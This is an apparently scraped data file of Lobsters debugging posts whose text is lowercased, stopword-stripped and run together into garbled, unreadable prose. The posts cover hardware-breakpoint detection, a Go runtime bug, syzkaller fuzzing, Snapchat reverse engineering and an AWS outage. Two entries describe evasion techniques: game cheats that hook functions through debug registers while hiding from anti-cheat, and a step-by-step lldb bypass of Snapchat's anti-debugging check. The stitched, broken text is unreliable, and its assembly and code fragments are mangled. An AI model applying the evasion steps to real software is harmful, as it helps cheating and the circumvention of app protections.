contextcontextflags contextdebugregisters set context setthreadcontext getcurrentthread context window exception know use hardware breakpoints time look window deal figure snippet interrupt table ntoskrnl hardware breakpoint triggered matter reason db exception triggered corresponds interrupt mean execution redirected interrupt handler information exception handled recommend reading blog post written daax window interrupt handler initialized boot time exactly done important interrupt handler found table called kiinterruptinittable ntoskrnlexe show u kidebugtraporfault interrupt handler interrupt second function entry ignored meltdown mitigation added window kidebugtraporfault start sanity check ensure g correct check added mitigate everything correct kxdebugtraporfault called function equivalent kidebugtraporfault mitigation added function start saving certain register trapframe rest function useful u check thing smap end function kiexceptiondispatch called kiexceptiondispatch bit interesting previous function start allocating exceptionframe stack filling save nonvolatile register done function make exceptionrecord fill info current exception afterwards kidispatchexception called kiexceptiondispatch proc near exceptionframe kexceptionframe ptr exceptionrecord exceptionrecord ptr sub rsp lea rax movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr mov rax rbx mov rdi mov rsi mov mov mov mov lea rax mov rax ecx xor ecx ecx mov ecx mov rcx mov mov edx mov mov mov mov previousmode mov byte ptr firstchance lea trapframe mov rdx rsp exceptionframe mov rcx rax exceptionrecord skipexceptionstack call kidispatchexception kidispatchexception fairly long function exception finally dispatched exception handler well almost short function apply transforms exception code combine trapframe exceptionframe contextrecord preprocess exception calling kipreprocessfault happens depends exception came usermode kernelmode case allow debugger handle first second chance exception came kernelmode rtldispatchexception called search seh handler call find seh handler exception handled correctly system bugcheck calling kebugcheckex exception came usermode certain field trapframe corrected stack pointer finally instruction pointer trapframe overwritten address keuserexceptiondispatcher get function bit exceptionrecord contextrecord copied user stack function return back kiexceptiondispatch simply clean stack restore volatile state saved earlier return usermode help iretq overwrote user stack earlier execution flow resumed keuserexceptiondispatcher lea rcx rcx ktrapframe movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr movaps xmmword ptr mov rbx rcx mov rdi mov rsi mov mov mov mov mov rdx mov rcx mov rax mov rsp rbp mov rbp add rsp swapgs iretq remember keuserexceptiondispatcher address set earlier actually kiuserexceptiondispatcher located ntdlldll function responsible usermode part handling exception get exceptionrecord context exception pas execution rtldispatchexception going much detail eventually check seh veh exception handler call present kiuserexceptiondispatcher proc near cld mov rax c test rax rax jz short mov rcx rsp add rcx mov rdx rsp call rax mov rcx rsp add rcx mov rdx rsp call rtldispatchexception test al al jz short mov rcx rsp xor edx edx call rtlguardrestorecontext jmp short mov rcx rsp add rcx mov rdx rsp xor call zwraiseexception mov ecx eax call rtlraisestatus kiuserexceptiondispatcher endp malicious us debugging mentioned name debug register primarily used debugging purpose regular breakpoints require editing assembly add breakpoint instruction hardware breakpoints able used without modifying assembly especially useful dealing selfmodifying code integrity check malware discreet usage builtin security control see bit also favourite tool malware author especially rootkits allow malware silently hook function used hook important system routine window dodebug linux cheating course technique also utilized cheat want remain hidden anticheats debug register used hook important game function implement custom logic good example outline veh hook released ebfe overwatch debug register placed function responsible drawing player outline exception handler registered using addvectoredexceptionhandler outline function get called game hardware breakpoint fire redirect control flow registered exception handler check exception came outline function edit data make game draw outline player appears technique quite good blizzard seems trouble detecting common detection vector final section go common detection vector hardware breakpoints sake simplicity obfuscation technique applied example left exercise reader go wild want getthreadcontext one simplest way detect hardware breakpoints using getthreadcontext winapi function simply return context structure given thread structure includes value debug register allows u easily check register filled detection easy implement also easy bypass example attacker simply hook getthreadcontext return fake structure stripped debug register field prepare context structure context context contextall fill field structure changed depending need contextcontextflags contextall call getthreadcontext current thread bool result getthreadcontext getcurrentthread context result getthreadcontext failed use getlasterror find return check debug register field debug register detected exception handler alternative way getting context structure including debug register registering exception handler first argument veh exception handler pointer exceptionpointers structure structure contains information current exception also pointer context structure easily check debug register filled multiple way implement detection simplest one using addvectoredexceptionhandler raiseexception exception handler long debugveh struct exceptionpointers exceptioninfo check exception exceptioninfo exceptionrecord exceptioncode check debug register field exceptioninfo contextrecord debug register detected fix divide zero error see second argument stored rcx simply change continuing exceptioninfo contextrecord rcx exception handled continue normal execution return exceptioncontinueexecution try next exception handler exception return exceptioncontinuesearch somewhere initialization function register exception handler addvectoredexceptionhandler debugveh detection triggered whenever want raising exception raiseexception nullptr alternatively work properly simply trigger divide zero error make sure change exception code fix error see volatile int b volatile int b attacker bypass detection making exception handler run combat possible hook earliest time exception get transferred usermode mentioned kiuserexceptiondispatcher implemented ntdlldll function hooked using various method simplest replacing pointer function work need done correctly grab argument allows exception handler run one mov drx instruction detection possible executing kernelmode used mov instruction available elsewhere using readdr writedr possible directly manipulate content debug register use intrinsics check debug register set important keep mind attacker might enabled general detect bit cause db exception generated every time debug register accessed used quickly clear register try check check debug register field readdr debug register detected checking hardware breakpoint triggered filled information event used make informed decision current situation important note automatically cleared hardware breakpoint handled following paragraph intel sdm describes detail certain debug exception may clear bit remaining content register never cleared processor avoid confusion identifying debug exception debug handler clear register except bit set returning interrupted task sure program use hardware breakpoints possible check value using previously mentioned technique attacker might cleared register using debug register one straightforward technique simply using available debug register technique limited creativity allows detect crash hardware used simple implementation technique put hardware breakpoints important function breakpoint called manipulate data returning original function attacker overwrites debug register data manipulation happen program crash example change assembly restores right execution repeated debug register removing one cause program crash change page permission rwx change assembly dword oldprotect bool result virtualprotect void testfunc pageexecutereadwrite oldprotect result virtualprotect failed call getlasterror find return change assembly garbage byte testfunc register veh addvectoredexceptionhandler debugveh set hardware breakpoint function context context contextcontextflags contextall getthreadcontext getcurrentthread context testfunc contextcontextflags contextdebugregisters setthreadcontext getcurrentthread context long debugveh struct exceptionpointers exceptioninfo check exception came u exceptioninfo exceptionrecord exceptioncode statussinglestep restore assembly executing nt crash change back garbage subsequent call crash achieved second hardware breakpoint byte testfunc set resume flag rf nt get stuck infinite loop exceptioninfo contextrecord eflags return exceptioncontinueexecution return exceptioncontinuesearch credit people whose prior research helped lot listed particular order reference intel software developer manual amd architecture programmer manual applied reverse engineering exception interrupt detecting debugger abusing bad assumption within window byepg defeating patchguard using exceptionhooking
53,Lobsters,debugging,Debugging,A very simple UDP-to-database logger,https://github.com/borud/simpleton,simple udptodatabase logger,simpleton building building platform syslistgo running poking around database accessing via http interface authentication security mechanism,simpleton simpleton dead simple udp database logging solution accepts udp packet store database per default store simpletondb current directory override command line option nt terribly useful anything really simple testing expand building order build simpleton run make binary turn bin directory per default build osx make building platform build platform please edit goo goarch variable makefile also enter parameter command line run make like gooslinux make find value variable different platform syslistgo common value o goo goarch osx darwin linux linux window window course cross compile eg compile linux binary osx machine setting right combination goo goarch though window might run trouble nt built window running binary turn bin run main directory binsimpleton list command line option use h flag binsimpleton h example running simpleton option make listen particular interface example port store database tmpsimpletondb binsimpleton u tmpsimpletondb poking around database want poke around resulting database install machine inspect database using command open database previous example run tmpsimpletondb type schema see simple database schema perform sql statement data note entirely sure concurrency would nt use database integration point never also code mutex lock around database access code taken project multiple goroutines accessing database program nt left mutex locking reminder production us use postgresql database similar built concurrency small experiment limited concurrency surprisingly capable little beast accessing via http interface note http interface authentication security mechanism nt use anything testing default address web interface http web interface quite simple two url access data data data id first return json array second return payload data entry given id data path limited newest entry database page database setting offset limit url parameter data simpleton support directory static file make html page useful link content perhaps host jsfrontend application check command line help see parameter fiddle
54,Lobsters,debugging,Debugging,Debugging an evil Go runtime bug (2017),https://marcan.st/2017/12/debugging-an-evil-go-runtime-bug/,debugging evil go runtime bug,preface prometheus grafana euskal encounter sqlexporter event dashboard euskal encounter fake staging data trouble horizon issue get using consumer hardware feature cozy digging deeper go issue bisecting machine juggling kernel config hashbased differential compilation vdso shenanigan feature stack clash conclusion pivot larger stack,preface big fan prometheus grafana former sre google learned appreciate good monitoring combination winner past year using monitoring personal server blackbox whitebox monitoring euskal encounter external internal event infra work professionally client prometheus make easy write custom exporter monitor data good chance find exporter already work box example use sqlexporter make pretty dashboard attendee metric encounter event event dashboard euskal encounter fake staging data since easy throw nodeexporter onto random machine prometheus instance scrape basic systemlevel metric cpu memory network disk filesystem usage etc figured also monitor laptop clevo gaming laptop serf primary workstation mostly pretending desktop home also traveling big event like chaos communication congress since already vpn one server run prometheus emerge prometheusnodeexporter bring service point prometheus instance automatically configures alert mean phone make loud noise whenever open way many chrome tab run ram perfect trouble horizon barely hour setting though phone get page newlyadded target inaccessible ala could ssh laptop fine definitely nodeexporter crashed fatal error unexpected signal runtime execution signal sigsegv segmentation violation goroutine running runtimethrow runtimesigpanic runtimeheapbitssettype runtimemallocgc runtimenewobject githubcomprometheusnodeexportervendorgithubcomprometheusclientgolangprometheusnewconstmetric nodeexporter like many prometheus component written go go relatively safe language allows shoot foot wish nearly strong safety guarantee say rust still easy accidentally cause segfault go nodeexporter relatively simple go app mostly purego dependency therefore interesting crash get especially since crash inside mallocgc never crash normal circumstance thing got interesting restarted time http panic serving runtime error growslice cap range goroutine running nethttp conn panic fmt buffer writestring fmt fmt padstring fmt fmt fmts fmt pp fmtstring fmt pp printarg fmt pp doprintf fmtsprintf fmterrorf well interesting crash sprintf time runtime pointer unallocated span spanbase runtime found object sbase sstatemspaninuse snip fatal error found bad pointer go heap incorrect use unsafe cgo runtime stack runtimethrow runtimeheapbitsforobject runtimescanobject runtimegcdrain runtimesystemstack runtimemstart garbage collector stumbled upon problem yet different crash point two natural conclusion either severe hardware issue wild memory corruption bug binary initially considered former unlikely machine heavily mixed workload sign instability traced back hardware fair share crashing software never random since go binary like nodeexporter statically linked depend library download official release binary try would eliminate rest system variable yet still got crash unexpected fault address fatal error fault signal sigsegv segmentation violation goroutine running runtimethrow runtimesigpanic githubcomprometheusnodeexportervendorgithubcomprometheusclientmodelgo labelpair getname githubcomprometheusnodeexportervendorgithubcomprometheusclientgolangprometheus desc string yet another completely different crash point decent chance truly upstream problem nodeexporter one dependency filed issue github perhaps developer seen worth bringing kind issue attention seeing idea unsurprisingly upstream first guess hardware issue unreasonable hitting problem one specific machine machine happily running nodeexporter evidence hardwarelinked instability host also explanation particular machine would make nodeexporter crash run never hurt anyone gave go happened get using consumer hardware whoop bad ram well specific one bit bad ram letting test run full pas got single bad bit plus false positive test move block around amplify single error testing showed test smp mode would quickly detect error usually first pas error always bit address suggests problem weak leaky ram cell particular one get worse temperature quite logical higher temperature increase leakage ram cell thus make likely somewhat marginal cell actually cause bit flip put perspective one bad bit actually good error rate hard disk flash memory much higher error rate device bad block marked factory transparently swapped without user knowing transparently mark newly discovered weak block bad relocate spare area ram luxury bad bit stick forever ala vanishingly unlikely cause nodeexporter woe app us little ram chance hitting bad bit repeatedly extremely low kind problem would largely unnoticeable perhaps causing pixel error graphic single letter flip text instruction corrupted probably ever run perhaps rare segfault something actually important land bad bit nonetheless cause longterm reliability issue server device intended reliable must use ecc ram correct kind error luxury ecc ram laptop though ability mark bad block ram bad tell o use littleknown feature grub allows changing memory map passed booted kernel worth buying new ram single bad bit especially since already obsolete good chance new ram would weak cell anyway good option however one thing since problem get worse temperature happens heat ram cozy using heat gun set fairly low temperature warmed two module time two module rear cover laptop four sodimm slot total playing around module order found three additional weak bit detectable elevated temperature spread around three ram stick also found location error stayed roughly consistent even swapped module around top bit address remained ram interleaved data spread four stick instead stick assigned contiguous quarter available address space convenient mask region ram large enough cover possible address error bit worry might swap stick future mess masking found masking contiguous area cover possible permutation address given bad bit good measure rounded gave three aligned block mask one cover two bad bit total four bad bit wanted masked specified using addressmask syntax required grub follows etcdefaultgrub grubbadram one quick grubmkconfig later ram four dodgy bit ecc ram increase effective reliability consumergrade ram since know rest memory fine least needle say nodeexporter still crashed knew real problem digging deeper annoying thing kind bug clearly caused kind memory corruption break code run later make hard debug predict corrupted varies catch bad code act first tried basic bisecting available nodeexporter release enablingdisabling different collector went nowhere also tried running instance strace seemed stop crash strongly point racecondition kind problem strace usually wind serializing execution apps extent intercepting system call run thread would later find strace instance crashed took much longer since seemed related concurrency tried setting tell go use single oslevel thread run go code also stopped crash pointing strongly concurrency issue gathered quite considerable number crash log starting notice pattern lot variation part crashing ultimately error message could categorized different type kind error showed started googling error stumbled upon go issue issue seemingly unrelated part go one caused similar segfaults random issue issue closed diagnosis reproduced go nobody knew root cause stopped happening grabbed sample code issue claimed reproduce problem ran machine lo behold crashed within second bingo lot better waiting hour nodeexporter crash get closer debugging issue go side give much faster way test let try another angle bisecting machine know problem happens laptop happen machine tried reproducer every machine easy access get crash tell something special laptop since go statically link binary rest userspace matter leaf two relevant part hardware kernel easy way test various hardware machine play kernel let try first order business crash vm test built minimal initramfs allow quickly launch reproducer qemu vm without actually install distro boot full linux system initramfs built linux scriptsgeninitramfslistsh contained following file dir dev nod devconsole c nod devnull c dir bin file binbusybox busybox slink binsh busybox slink bintrue busybox file init initsh file reproducer reproducer init entry point linux initramfs case simple shellscript start test measure time binsh export pathbin start busybox date echo starting test reproducer ret end busybox date echo test exited status ret endstart second binbusybox statically linked version busybox often used minimal system like provide basic linux shell utility including shell initramfs built like linux kernel source tree listtxt file list scriptsgeninitramfslistsh initramfsgz listtxt qemu boot kernel initramfs directly kernel initrd initramfsgz append smp nographic serial mon stdio cpu host enablekvm resulted output realized even compiled serial port support laptop kernel oh mean physical serial port right anyway quick detour rebuild kernel serial support crossing finger change anything important tried successfully booted ran reproducer crash yup good mean problem reproducible vm machine tried qemu command home server kernel nothing copied kernel laptop booted crashed kernel matter hardware issue juggling kernel point knew going compiling lot kernel try narrow decided move powerful machine lying around somewhat old xeon defunct sadly copied knownbad kernel source machine built tested crash headscratching later made sure original bad kernel binary crashed back hardware matter machine build kernel tried building kernel home server one promptly triggered crash building kernel two machine yield crash third machine difference well gentoo box gentoo hardened laptop home server unstable xeon server stable mean gcc different laptop home server gcc gentoo hardened xeon gcc gentoo hardened home server kernel nearly version laptop though exactly built gcc reproduce crash conclude compiler used build kernel kernel config matter narrow thing compiled exact kernel tree laptop home server confirmed indeed crashed copied config home server compiled found mean looking kernel config difference compiler difference gcc laptop config crash gcc laptop config crash gcc server config crash two configs one good one bad time diff course two configs vastly different since tend tailor kernel config include driver need particular machine repeatedly rebuild kernel narrowing difference decided start known bad config start removing thing since reproducer take variable amount time crash easier test still crash wait crash crash long wait convince course kernel build managed simplify config much kernel networking support filesystems block device core even support pci still work fine vm though kernel build took le second kernel size regular one moved known good config removed unnecessary junk making sure still crash reproducer trickier slower previous test false branch changed something made reproducer start crashing know yet misidentified crash got crash walk back previous kernel built make sure knew exactly crash introduced ended kernel build eventually narrowed small handful different config option stood particular configoptimizeinlining carefully testing concluded indeed option culprit turning produced kernel crash reproducer testcase turning produced kernel option turned allows gcc better determine inline function really must inlined instead forcing inline unconditionally also explains gcc connection inlining behavior likely change gcc version force alwaysinline user request via config gcc old gcc warn unused static inline function wunusedfunction turn avoid need complex ifdef directive suppress warning clang well using unused function attribute redundant harmful gcc defined configarchsupportsoptimizedinlining defined configoptimizeinlining gnuc define inline inline attribute alwaysinline unused notrace define inline inline attribute alwaysinline unused notrace define inline inline attribute alwaysinline unused notrace else lot inline function cause havoc function tracing define inline inline attribute unused notrace define inline inline attribute unused notrace define inline inline attribute unused notrace endif next know configoptimizeinlining make difference potentially change behavior every single inline function across whole kernel pinpoint problem idea hashbased differential compilation basic premise compile part kernel option turned part kernel option turned testing resulting kernel checking whether problem appears deduce subset kernel compilation unit contains problem code instead trying enumerate object file kind binary search decided go hashbased approach wrote wrapper script gcc binbash args doit gt case c shift objfile esac shift done extra z doit sha echo n objfile cut echo objfile objstxt bit echo n objfile else extradconfigoptimizeinlining echo objfile fi fi exec gcc extra args hash object file name check given bit hash first bit identified bit environment variable bit build without configoptimizeinlining build configoptimizeinlining found kernel around object file point minimization effort paid requires bit unique identification hashbased approach also one neat property choose worry crashing outcome bit since much harder prove given kernel build crash crash probabilistic take quite sometimes built kernel one bit prefix took minute started testing every time got crash narrowed regular expression possible hash zero bit specific position crash thus zero bit object file couple looking promising hit crash single match grep vdso code course vdso shenanigan kernel vdso actually kernel code vdso small shared library kernel place address space every process allows apps perform certain special system call without ever leaving user mode increase performance significantly still allowing kernel change implementation detail system call needed word vdso gcccompiled code built kernel end linked every userspace app userspace code explains kernel compiler mattered kernel shared library provided kernel go us vdso performance go also happens rather insane opinion policy reinventing standard library use standard linux glibc code call vdso rather roll call syscalls flipping configoptimizeinlining vdso let look assembly configoptimizeinliningn file format disassembly section text vreadtsc push rbp mov rsp rbp nop nop nop rdtsc shl rdx rdx rax mov rip rdx cmp rax rdx ja pop rbp retq mov rdx rax pop rbp retq nopl rax nopw rax vdsoclockgettime push rbp mov rsp rbp ec sub rsp orq rsp add rsp lea rip ff cmp edi je dc jle ff cmp edi je ff cmp edi jne configoptimizeinliningy file format disassembly section text vdsoclockgettime push rbp lea rip ff cmp edi b mov rsp rbp e je dc jle ff cmp edi je ff cmp edi jne interestingly configoptimizeinliningy supposed allow gcc inline le actually resulted inlining vreadtsc inlined version configoptimizeinliningn version vreadtsc marked inline gcc perfectly within right behave like counterintuitive may care function inlined actual problem well looking closer noninline push rbp mov rsp rbp ec sub rsp orq rsp add rsp gcc allocating stack stack allocation stack probe specifically result fstackcheck gcc feature gentoo linux enables fstackcheck default hardened profile mitigation stack clash vulnerability fstackcheck old gcc feature intended turn effectively mitigates issue told proper stack clash protection gcc sideeffect cause fairly silly behavior every nonleaf function function make function call end probing stack kib ahead stack pointer word code compiled fstackcheck potentially need least kib stack space unless leaf function function every call inlined go love small stack text sb nosplit careful calling function gcc calling convention guaranteed byte entry taken call us another leaf gettime code use hope enough turn byte enough everybody certainly kernel worth pointing vdso specification make mention maximum stack usage guarantee squarely go fault making invalid assumption conclusion perfectly explains symptom stack probe orq logical noop effectively probe target address unmapped segfault seeing segfaults vdso code breaking go well really noop since orq atomic instruction really happens cpu read memory address writes back creates race condition thread running parallel cpu orq might effectively wind undoing memory write occurs simultaneously since write stack bound likely intruding thread stack random data star line undoing memory write also work around issue since prevents two thread effectively running go code time fix left go devs solution ultimately pivot larger stack calling vdso function introduces small speed penalty nanosecond acceptable building nodeexporter fixed go toolchain crash went away
55,Lobsters,debugging,Debugging,"Syzkaller can be enhanced to find bugs in specific Linux drivers, such as V4L2",https://www.collabora.com/news-and-blog/blog/2020/06/26/using-syzkaller-part-4-driver-fuzzing/,syzkaller enhanced find bug specific linux driver,part part part motivation starting point description defined bug request api feature idea syzlang enhancing syzkaller fuzzing specific driver file change documented conclusion unreachable syzbot,following previous entry series syzkaller part part part learned syzkaller use help u catch bug linux kernel code take deeper dive see could enhanced used purpose fuzzing specific driver motivation starting point one current line work collabora involves driver task like improving support stateless codecs hantro fuzzer invaluable tool development debugging process make fuzz particular code interested syzkaller come set system call description variety operating system linux system call already defined although subsystem better supported others usb socketrelated syscalls example thorough specific description syzkaller executor includes pseudosyscalls assist usb network fuzzing however supported sense involved system call including myriad ioctls data structure described already useful equipped description syzkaller able find many bug fuzzing process contains lot randomness good thing many case come fuzzing due complexity api simply randomizing system call input may enough reach code driver especially driver complicated interface based request api including stateless driver operation driver grouped together previously allocated request referenced using request descriptor request descriptor must used way system call part request time randomizing descriptor wo nt yield interesting result additionally operation involve many system call must issued specific order concrete argument order make certain part driver run randomizing input valuable scenario letting fuzzer freely randomize everything additional guidance code coverage would make difficult cover part code targeting particular driver want run system call device file driver handle describe additional open openat syscalls test case operate concrete device file would impose certain restriction test image kernel example may point different device depending kernel configuration user may need reconfigure test kernel andor filesystem make match syzkaller description vice versa finally also may want execute literal c code block helper function test way would able perform static operation wo nt fuzzed preparing test environment actual fuzzing begin feature idea based requirement began thinking feature would nice order help syzkaller focus particular driver basically want able define system call execution order save state data syscalls target specific device file define c code block easy way talking syzkaller maintainer dmitry vyukov mailing list mentioned adding new feature interested extending current set syscall description making full use current feature first step therefore analyze feature syzkaller already provides make best use extend whenever necessary propose new feature point already supported way resource syzlang syzkaller syscall description language resource represent value produced syscall consumed another describe syscall return produce resource another one us input implicitly defining dependency relationship two loose ordering constraint way passing data lot example syzkaller description resource fd open file ptr filename flag flag openflags mode flag openmode fd read fd fd buf buffer count len buf defines fd integer resource returned open used read nt mean test program syzkaller generate call read open way tell want generate test program call open save resulting descriptor pas subsequent read call enhancing syzkaller fuzzing specific driver let try put syzkaller work specific driver case would like target driver good way start using one virtual one let u fuzz specific part core framework without use special hardware initial description one huge file containing supported system call data structure flag config file test specify syscalls want enable order restrict search space fuzzer even flag like buffer type randomized whenever possible produce lot unnecessary fuzzing driver concerned output capture buffer first step towards efficient driver fuzzing split big syscall description smaller chunk narrower definition went ahead driver change already part syzkaller using new description launch syzkaller using simple config file simply enables specific openat call defined ioctls syzkaller enable resource produced openat input enablesyscalls openat ioctl instead using possible buffer type ioctls use two type defined make syscalls use appropriate device file driver point desired feature found nice straightforward way require additional syzkaller code using udev rule generate symlinks appropriate device case symlink named pointing devvideox device managed added imagecreating script generate appropriate udev rule automatically easy extend driver syzkaller program look like using configuration openat ioctl pixmp translated c code autogenerated syzkaller http githubcomgooglesyzkaller define gnusource include include include include include include syssyscallh include systypesh include r int main void syscall nrmmap syscall nrmmap syscall nrmmap intptrt re memcpy void re syscall nropenat re r re syscall nrioctl r return defined openat open device file descriptor return used vidioccreatebufs ioctl note syzkaller still generate program nt follow requirement described simply allows syzkaller generate better guided code wo nt prevent generating randomized program lastly worked small proof concept use userdefined literal c function part generated program point feature list way syzkaller pseudosyscalls defined part executor although adding static code syzkaller discouraged good know possibility let u thing like setting test environment leave system certain state fuzzing creating wrapper primitive system call forging input binary data pseudosyscalls write documented change used adapted many different driver course order make detailed description particular driver need familiar least interface possible general idea apply example fuzz real driver hantro would target different set file therefore need define different udev rule create appropriate symlinks may also need define additional syscall description redefine existing one work restricted set parameter benefit creating pseudosyscalls perform complex operation sequence controlled way course would use real hardware target see concrete example next installment series conclusion syzkaller promising project much needed tool linux kernel testing debugging example easy jump make better change submitted already helpful fuzzing code previously unreachable hope help syzbot find bug good starting point anyone want keep contributing improve syzkaller
56,Lobsters,debugging,Debugging,Reverse Engineering Snapchat (Part II): Deobfuscating the Undeobfuscatable,https://hot3eed.github.io/2020/06/22/snap_p2_deobfuscation.html,reverse engineering snapchat part ii deobfuscating undeobfuscatable,reverse engineering snapchat part ii deobfuscating undeobfuscatable black box deoptimizing optimization evan spiegel hate trick bypass breakpoint check getting want anchor address watchpoints underrated trick dirty dream assembly mba synthesis rewrite rule standing shoulder giant mba simplification example adriengnt cool snap,reverse engineering snapchat part ii deobfuscating undeobfuscatable black box many hackernews user suggested using emulation generate token treating whole thing black box problem solution mentioned comment way many real device dependency xsnapchatclientauthtoken random gibberish contains lot info device encrypted even use corellium leave saying chance working slim see alternative reversing deoptimizing optimization first monstrosity achieved compile helloc using clang clang front end llvm real deal meaning clang take c source convert intermediate representation ir llvm interprets ir optimizes compiles machine code advantage system backend remains languageagonstic write llvmircompatiblefront end language leave rest llvm interested optimization aka optimization pass llvm operates ir generate efficient code might look bit different assembly expect obfuscation come instead actually optimizing code change however want long keep semantics work compiler level one maintain source code like team behind ollvm acquired snap understand obfuscation reverse generate something resembles original assembly well articulated one hackernews obfuscation mostly lossy deobfuscate want many cool allow way better getting hand dirty binary directly evan spiegel hate trick bypass breakpoint check might end snapchat reversing career whole post really one biggest hurdle binary fuckupdebugging able kind dynamic analysis way go binary opinion patch fuckupdebugging return right pathkey take right execution infinite loop antitamepring check stop communicating server modified binary first even get right pathkey defnition set breakpoint get fuckupdebugging first place dead lock let see action function return token block call fuckupdebugging know debug block right infinite loop mov movk lsl movk lsl movk lsl mov movk lsl movk lsl movk lsl add func pointer add another func pointer mov movk lsl nt care blr fuckupdebugging called adrp ldr eor returned pathkey cmp orr wzr csel hi ldr lsl br hide breakpoints fuckupdebugging set breakpoint right called disable breakpoint disable case single step inside fuckupdebugging far fuckupdebugging concerned breakpoints exist set breakpoint return stop lldb b know lldb c correct pathkey profit couple gotchas got smart like disabling breakpoints stepped fuckupdebugging using lldb ni instead single stepping get infinite loop set another breakpoint stepping essentially breakpoint address next instruction single stepping sweet little ptrace command ptracesinglestep word executes cpu level code patching weakness fuckupdebugging check breakpoints able set breakpoints inside harmlessly new challenge future snap reverse engineer patch bypassed one breakpoint check one function every function token generation breakpointchecked every check bypass using method add comment correct path key future matter lldb ni lldb po pathkey stepped fuckupdebugging patched return value fly bit slowed every patched function least real debugging getting want happens high level token joint function gentoken call settokenparams mammoth joint function call many function token encrypted returned gentoken get info like spend time binary make educated guess rough big picture go something specific bottomup approach concise let go example would reverse specific token parameter anchor address bookmark critical area binary save lot time headache example bookmark token params written right token encrypted etc way start working certain parameter knowing offset token structure since closest trace know generated find anchor address first place watchpoints underrated asked give one word solve half problem snap binary would tell watchpoints example idea start anything know gentoken return token pointer lead trace gentoken return find pointer actually written another function returned gentoken say equivalent c code char gentoken stuff char tokenout tokenlen realdeal tokenout return tokenout realdeal called set watchpoint tokenout disable breakpoints fuckupdebugging happy continue execution watchpoint stop process written toread getting possibly critical point code use anchor second ace snap binary lldb w e w write lldb c stop soon address accessed anchor address trick dirty watchpoints nice register set watchpoints theory could another time value interested register answer execution trace text editor support regex suppose settokenparams know value interested ldr sp token parameter offset str token parameter instruction since start block cfg idea came generated execution trace using frida point near settokenparams enough one know policed fuckupdebugging frida patch instruction hook function trigger breakpoints check sequential execution trace used good old text editor find block searched point written source data dream assembly find certain paramter generated function see way reverse high level source code equivalent see c haha best fit accurately translate data structurestypes assembly c close c cpu still know struct alignment work make educated guess certain value type keep track stack offset dream assembly instruction working binary shit mba mba expression trickiest thing binary latest mba say effectively two way simplify mba expression let explain give example binary synthesis treat whole expression black box oracle give input observe output try generate function simulating behavior biggest problem impractical complex rewrite rule rule simplification hardcoded example rule say x x x try match rule expression recursively use smt solver prove original expression identical simplified tone problem rule universal like booleanalgebraic simplification able handle expression outside hardcoded one standing shoulder giant first step extracting expression binary using symbolic basically way executing binary assign concrete value variable symbol good fit awesome framework extracting expression synthesis could still use rewrite rule exists quarkslab python mba simplification example example involves instruction block whose input two value stack whose output register trickiest output one first need extract expression symbolize block input using tritonsymbolizememory emulating block get full expression register using tritongetsymbolicregister regast unroll brace print real expression le scary triton add bit mask let see sspam say sspam cat good sspam tool know exist mba rewrite rule give meaningful simplification thought let try synthesis used python eval plug different input expression see bit output react try fun end synthesized expression see getting simpler identical obfuscated expression let ask obfscexpr simpexpr proved bingo edit adriengnt brought attention arybo worked quarkslab seem monopoly mba able simplify expression one say state art far mba obfuscation go interesting wan na get technical cool snap much token generation obfuscation able work binary level half battle disclose communicate api godfather taught u anything perfect number sequel one
57,Lobsters,debugging,Debugging,"Spooky action at a distance, how an AWS outage ate our load balancer",https://www.hostedgraphite.com/blog/spooky-action-at-a-distance-how-an-aws-outage-ate-our-load-balancer,spooky action distance aws outage ate load balancer,monitoring status page internal external canary need go deeper heroku aws status page cause symptom hostedgraphitecom chatbot adventure clear picture postmortem,distributed system complex beast notoriously hard debug sometimes hard understand outage one service affect another matter much think understand given system still surprise u new interesting way follows story one moment outage provider use directly indirectly resulted service becoming quiet friday night utc start receiving first report trouble monitoring tell u website intermittently becoming unavailable periodic check website graph rendering api timing always user impacting incident proceed update status page ensure user uptodate information status servicewhile begin investigation start gathering know incident far however find manages confuse u even observe overall drop traffic across ingestion protocol coupled initial report unavailability website render api make u immediately suspect network connectivity issuesby checking internal external canary notice ingestion affected certain aws region particular ingestion http api affected regardless locationto compound issue internal service non userfacing start report timeoutsat point struggling find common thread tie everything together data indicates connectivity issue certain aws region would seem explain decrease ingested traffic given many user hosted aws however still problem quite explain location trouble sending data http api website still intermittently becoming unresponsive left many option given aws connectivity issue best lead decide follow throughwe need go deeperafter digging realise internal service experiencing issue rely integration dependency aws heroku severely affected issue later confirmed aws status page reporting connectivity issue region unfortunately still help u understand aws outage affect serve site neither hosted aws physically located anywhere near affected aws regionscause symptom point attention turn part http frontend hosted aws health check selfhosted load balancer quickly detect issue load balancer rely aws health check let u identify unhealthy load balancer remove dns result hostedgraphitecom giving u simple yet effective way ensure advertise healthy load balancer serve production traffic health check log report failure variety location stand sure failure cause symptom problem decide temporarily disable health check either confirm rule theorychatbot downour sre team relies heavily glitter trusty sre chatbot assist u many operational task normal circumstance simple operation disable health check slack channel however thing quite straightforward expect aws outage impacted irc gateway chatbot relies mean make necessary change manually unfortunately disabling health check quite fix thing continue digging clue one thing notice load balancer log report failure complete ssl handshake ip address outside normal aws range test several location confirm ssl handshake take unacceptably long regardless location tryit point rather anticlimactic manner aws incident get resolved traffic rate start slowly recover confirming aws outage trigger incident utcso thing go back normal however know happened dig deeper monitoring tool come two visualization built load balancer log help u paint clear picture exactly happenedthe first show number active connection load balancer happens increase sharply flatline exactly time period experiencing issuesthis explains ssl handshake woe load balancer accepting new connection limit reached result new connection queued might end timing processedthat go long way towards solving mystery however still quite sure connection originating know increase number request received actually seen decrease rest ingestion pipeline thankfully load balancer log complete enough build following visualization help u finally crack case visualization heatmap aside looking like enemy straight adventure trying pack lot information limited space try decipher heatmap represents average time took host different isps send full http request load balancer row represents different isp showing long took host isp send full request time time millisecond warmer colour meaning longer time particular case top row represents request coming aws host mainly instance allows u see incident taking second make full request isps remained largely unaffecteda clear pictureafter putting piece together clear picture emerged aws host affected region experiencing connectivity issue significantly slowed connection load balancer bad enough break connection result host hogging available connection hit connection limit load balancer causing host location unable create new connection confirming first step towards making change prevent happening case included enforcing stricter client timeouts raising connection limit new visualization also become common tool sre support team use often troubleshooting load balancing layer everything learned incident shared user postmortemand story aws outage managed break service hosted aws anywhere near
